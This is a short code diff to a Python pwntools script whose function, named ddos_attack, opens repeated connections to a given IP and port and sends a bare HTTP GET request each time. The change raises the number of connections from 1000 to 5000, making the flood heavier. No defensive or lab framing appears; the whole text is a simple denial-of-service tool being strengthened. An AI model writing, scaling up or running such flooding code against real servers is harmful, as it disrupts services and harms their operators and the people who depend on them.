@@ -2,7 +2,7 @@ from pwn import *
 
 
 def ddos_attack(ip, port):
-    for _ in range(1000):
+    for _ in range(5000):
         target = remote(ip, port)
         target.send(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")
         target.close()
